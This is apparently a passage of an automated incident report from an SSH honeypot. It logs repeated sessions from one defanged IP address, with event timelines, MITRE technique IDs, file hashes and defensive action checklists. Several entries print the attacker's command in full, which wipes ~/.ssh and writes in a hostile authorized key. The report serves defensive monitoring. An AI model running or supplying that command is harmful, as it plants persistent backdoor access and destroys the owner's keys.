| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:10:54` | `cowrie.session.connect` |
| `2026-04-17 10:10:54` | `cowrie.client.version` |
| `2026-04-17 10:10:55` | `cowrie.client.kex` |
| `2026-04-17 10:10:55` | `cowrie.login.success` |
| `2026-04-17 10:10:56` | `cowrie.session.params` |
| `2026-04-17 10:10:56` | `cowrie.command.input` |
| `2026-04-17 10:10:56` | `cowrie.command.failed` |
| `2026-04-17 10:10:56` | `cowrie.log.closed` |
| `2026-04-17 10:10:56` | `cowrie.session.params` |
| `2026-04-17 10:10:56` | `cowrie.command.input` |
| `2026-04-17 10:10:56` | `cowrie.session.file_download` |
| `2026-04-17 10:10:56` | `cowrie.log.closed` |
| `2026-04-17 10:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb27fe65c7cc

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:10 |
| **Last Seen** | 2026-04-17 10:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:10:58` | `cowrie.session.connect` |
| `2026-04-17 10:10:58` | `cowrie.client.version` |
| `2026-04-17 10:10:59` | `cowrie.client.kex` |
| `2026-04-17 10:10:59` | `cowrie.login.success` |
| `2026-04-17 10:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faeeec3d809f

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:13 |
| **Last Seen** | 2026-04-17 10:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:13:39` | `cowrie.session.connect` |
| `2026-04-17 10:13:39` | `cowrie.client.version` |
| `2026-04-17 10:13:39` | `cowrie.client.kex` |
| `2026-04-17 10:13:40` | `cowrie.login.success` |
| `2026-04-17 10:13:40` | `cowrie.session.params` |
| `2026-04-17 10:13:40` | `cowrie.command.input` |
| `2026-04-17 10:13:40` | `cowrie.command.failed` |
| `2026-04-17 10:13:40` | `cowrie.log.closed` |
| `2026-04-17 10:13:41` | `cowrie.session.params` |
| `2026-04-17 10:13:41` | `cowrie.command.input` |
| `2026-04-17 10:13:41` | `cowrie.session.file_download` |
| `2026-04-17 10:13:41` | `cowrie.log.closed` |
| `2026-04-17 10:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-401633034b97

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:13 |
| **Last Seen** | 2026-04-17 10:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:13:43` | `cowrie.session.connect` |
| `2026-04-17 10:13:43` | `cowrie.client.version` |
| `2026-04-17 10:13:43` | `cowrie.client.kex` |
| `2026-04-17 10:13:44` | `cowrie.login.success` |
| `2026-04-17 10:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d2e2dd5c534

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:15 |
| **Last Seen** | 2026-04-17 10:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:15:04` | `cowrie.session.connect` |
| `2026-04-17 10:15:04` | `cowrie.client.version` |
| `2026-04-17 10:15:04` | `cowrie.client.kex` |
| `2026-04-17 10:15:05` | `cowrie.login.success` |
| `2026-04-17 10:15:05` | `cowrie.session.params` |
| `2026-04-17 10:15:05` | `cowrie.command.input` |
| `2026-04-17 10:15:05` | `cowrie.command.failed` |
| `2026-04-17 10:15:05` | `cowrie.log.closed` |
| `2026-04-17 10:15:05` | `cowrie.session.params` |
| `2026-04-17 10:15:05` | `cowrie.command.input` |
| `2026-04-17 10:15:06` | `cowrie.session.file_download` |
| `2026-04-17 10:15:06` | `cowrie.log.closed` |
| `2026-04-17 10:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1316511fea94

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:15 |
| **Last Seen** | 2026-04-17 10:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:15:08` | `cowrie.session.connect` |
| `2026-04-17 10:15:08` | `cowrie.client.version` |
| `2026-04-17 10:15:08` | `cowrie.client.kex` |
| `2026-04-17 10:15:09` | `cowrie.login.success` |
| `2026-04-17 10:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ef92266825a

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:17 |
| **Last Seen** | 2026-04-17 10:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:17:55` | `cowrie.session.connect` |
| `2026-04-17 10:17:55` | `cowrie.client.version` |
| `2026-04-17 10:17:55` | `cowrie.client.kex` |
| `2026-04-17 10:17:55` | `cowrie.login.success` |
| `2026-04-17 10:17:56` | `cowrie.session.params` |
| `2026-04-17 10:17:56` | `cowrie.command.input` |
| `2026-04-17 10:17:56` | `cowrie.command.failed` |
| `2026-04-17 10:17:56` | `cowrie.log.closed` |
| `2026-04-17 10:17:56` | `cowrie.session.params` |
| `2026-04-17 10:17:56` | `cowrie.command.input` |
| `2026-04-17 10:17:56` | `cowrie.session.file_download` |
| `2026-04-17 10:17:56` | `cowrie.log.closed` |
| `2026-04-17 10:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c192d5e53c3f

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:17 |
| **Last Seen** | 2026-04-17 10:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:17:59` | `cowrie.session.connect` |
| `2026-04-17 10:17:59` | `cowrie.client.version` |
| `2026-04-17 10:17:59` | `cowrie.client.kex` |
| `2026-04-17 10:17:59` | `cowrie.login.success` |
| `2026-04-17 10:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd143aa11c55

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:23 |
| **Last Seen** | 2026-04-17 10:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:23:47` | `cowrie.session.connect` |
| `2026-04-17 10:23:47` | `cowrie.client.version` |
| `2026-04-17 10:23:47` | `cowrie.client.kex` |
| `2026-04-17 10:23:47` | `cowrie.login.success` |
| `2026-04-17 10:23:48` | `cowrie.session.params` |
| `2026-04-17 10:23:48` | `cowrie.command.input` |
| `2026-04-17 10:23:48` | `cowrie.command.failed` |
| `2026-04-17 10:23:48` | `cowrie.log.closed` |
| `2026-04-17 10:23:48` | `cowrie.session.params` |
| `2026-04-17 10:23:48` | `cowrie.command.input` |
| `2026-04-17 10:23:48` | `cowrie.session.file_download` |
| `2026-04-17 10:23:48` | `cowrie.log.closed` |
| `2026-04-17 10:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55ffa2f78ae2

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:23 |
| **Last Seen** | 2026-04-17 10:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:23:50` | `cowrie.session.connect` |
| `2026-04-17 10:23:50` | `cowrie.client.version` |
| `2026-04-17 10:23:51` | `cowrie.client.kex` |
| `2026-04-17 10:23:51` | `cowrie.login.success` |
| `2026-04-17 10:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bdfe02dd608

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:26 |
| **Last Seen** | 2026-04-17 10:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:26:34` | `cowrie.session.connect` |
| `2026-04-17 10:26:34` | `cowrie.client.version` |
| `2026-04-17 10:26:35` | `cowrie.client.kex` |
| `2026-04-17 10:26:35` | `cowrie.login.success` |
| `2026-04-17 10:26:36` | `cowrie.session.params` |
| `2026-04-17 10:26:36` | `cowrie.command.input` |
| `2026-04-17 10:26:36` | `cowrie.command.failed` |
| `2026-04-17 10:26:36` | `cowrie.log.closed` |
| `2026-04-17 10:26:36` | `cowrie.session.params` |
| `2026-04-17 10:26:36` | `cowrie.command.input` |
| `2026-04-17 10:26:36` | `cowrie.session.file_download` |
| `2026-04-17 10:26:36` | `cowrie.log.closed` |
| `2026-04-17 10:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ec17b7f092

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:26 |
| **Last Seen** | 2026-04-17 10:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:26:38` | `cowrie.session.connect` |
| `2026-04-17 10:26:38` | `cowrie.client.version` |
| `2026-04-17 10:26:39` | `cowrie.client.kex` |
| `2026-04-17 10:26:39` | `cowrie.login.success` |
| `2026-04-17 10:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee69d3d5f56

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:28 |
| **Last Seen** | 2026-04-17 10:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:28:00` | `cowrie.session.connect` |
| `2026-04-17 10:28:00` | `cowrie.client.version` |
| `2026-04-17 10:28:01` | `cowrie.client.kex` |
| `2026-04-17 10:28:01` | `cowrie.login.success` |
| `2026-04-17 10:28:02` | `cowrie.session.params` |
| `2026-04-17 10:28:02` | `cowrie.command.input` |
| `2026-04-17 10:28:02` | `cowrie.command.failed` |
| `2026-04-17 10:28:02` | `cowrie.log.closed` |
| `2026-04-17 10:28:02` | `cowrie.session.params` |
| `2026-04-17 10:28:02` | `cowrie.command.input` |
| `2026-04-17 10:28:02` | `cowrie.session.file_download` |
| `2026-04-17 10:28:02` | `cowrie.log.closed` |
| `2026-04-17 10:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b8d89cf092a

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:28 |
| **Last Seen** | 2026-04-17 10:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:28:05` | `cowrie.session.connect` |
| `2026-04-17 10:28:05` | `cowrie.client.version` |
| `2026-04-17 10:28:05` | `cowrie.client.kex` |
| `2026-04-17 10:28:05` | `cowrie.login.success` |
| `2026-04-17 10:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b41b47185168

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:29 |
| **Last Seen** | 2026-04-17 10:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:29:28` | `cowrie.session.connect` |
| `2026-04-17 10:29:28` | `cowrie.client.version` |
| `2026-04-17 10:29:29` | `cowrie.client.kex` |
| `2026-04-17 10:29:29` | `cowrie.login.success` |
| `2026-04-17 10:29:30` | `cowrie.session.params` |
| `2026-04-17 10:29:30` | `cowrie.command.input` |
| `2026-04-17 10:29:30` | `cowrie.command.failed` |
| `2026-04-17 10:29:30` | `cowrie.log.closed` |
| `2026-04-17 10:29:30` | `cowrie.session.params` |
| `2026-04-17 10:29:30` | `cowrie.command.input` |
| `2026-04-17 10:29:30` | `cowrie.session.file_download` |
| `2026-04-17 10:29:30` | `cowrie.log.closed` |
| `2026-04-17 10:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86217682cd64

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:29 |
| **Last Seen** | 2026-04-17 10:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:29:33` | `cowrie.session.connect` |
| `2026-04-17 10:29:33` | `cowrie.client.version` |
| `2026-04-17 10:29:33` | `cowrie.client.kex` |
| `2026-04-17 10:29:33` | `cowrie.login.success` |
| `2026-04-17 10:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b9f03ad4e4b

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:33 |
| **Last Seen** | 2026-04-17 10:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:33:41` | `cowrie.session.connect` |
| `2026-04-17 10:33:41` | `cowrie.client.version` |
| `2026-04-17 10:33:41` | `cowrie.client.kex` |
| `2026-04-17 10:33:42` | `cowrie.login.success` |
| `2026-04-17 10:33:42` | `cowrie.session.params` |
| `2026-04-17 10:33:42` | `cowrie.command.input` |
